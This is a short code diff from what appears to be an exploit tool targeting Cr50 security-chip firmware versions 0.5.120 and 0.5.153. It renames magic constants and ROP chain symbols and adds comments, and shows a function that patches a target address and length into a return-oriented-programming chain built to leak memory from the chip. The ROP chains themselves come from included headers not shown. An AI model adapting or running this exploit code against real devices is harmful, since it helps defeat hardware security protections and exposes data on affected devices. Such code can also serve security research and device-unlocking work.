@@ -24,8 +24,8 @@
 #define GC_GLOBALSEC_ALERT_CONTROL (GC_GLOBALSEC_BASE + 0x405c)
 #define GC_GLOBALSEC_HIDE_ROM (GC_GLOBALSEC_BASE + 0x40d0)
 
-#define ADDRESS_LEAK_START_MAGIC 0x0add4e55
-#define ADDRESS_LEAK_SIZE_MAGIC 0xb1750000
+#define LEAK_DATA_ADDRESS_MAGIC 0x0add4e55
+#define LEAK_DATA_SIZE_MAGIC 0xb1750000
 
 #include "rop.hh"
 #include "rop-0-5-120.h"
@@ -36,9 +36,9 @@ using namespace std;
 static void set_address_spaces(uint32_t *buf, size_t buf_size, uint32_t adr, uint32_t len)
 {
 	for (int i = 0; i < (buf_size / sizeof(uint32_t)); ++i) {
-		if (buf[i] == ADDRESS_LEAK_START_MAGIC)
+		if (buf[i] == LEAK_DATA_ADDRESS_MAGIC)
 			buf[i] = adr;
-		if (buf[i] == ADDRESS_LEAK_SIZE_MAGIC)
+		if (buf[i] == LEAK_DATA_SIZE_MAGIC)
 			buf[i] = len;
 	}
 }
@@ -55,25 +55,25 @@ static uint8_t *get_dataleak_chain(uint32_t adr, uint32_t len, size_t &out_size)
 
 	ver = fval("--version","-V", 1);
 	
-	const uint32_t *main_chain = nullptr;
-	const uint32_t *init_chain = nullptr;
+	const uint32_t *main_chain = nullptr; // ROP chain with the main payload.
+	const uint32_t *init_chain = nullptr; // ROP chain used to gain more stack space.
 	uint32_t main_size = 0;
 	uint32_t init_size = 0;
 
 	/* appleflyer's Cr50 version */
 	if (ver == "0.5.120") {
-		main_chain = main_ropchain_0_5_120;
+		main_chain = leak_data_main_ropchain_0_5_120;
 		init_chain = init_ropchain_0_5_120;
 
-		main_size = sizeof(main_ropchain_0_5_120);
+		main_size = sizeof(leak_data_main_ropchain_0_5_120);
 		init_size = sizeof(init_ropchain_0_5_120);
 		
 	/* Hannah's and WTT's Cr50 version */
 	} else if (ver == "0.5.153") {
-		main_chain = main_ropchain_0_5_153;
+		main_chain = leak_data_main_ropchain_0_5_153;
 		init_chain = init_ropchain_0_5_153;
 
-		main_size = sizeof(main_ropchain_0_5_153);
+		main_size = sizeof(leak_data_main_ropchain_0_5_153);
 		init_size = sizeof(init_ropchain_0_5_153);
 
 	} else {
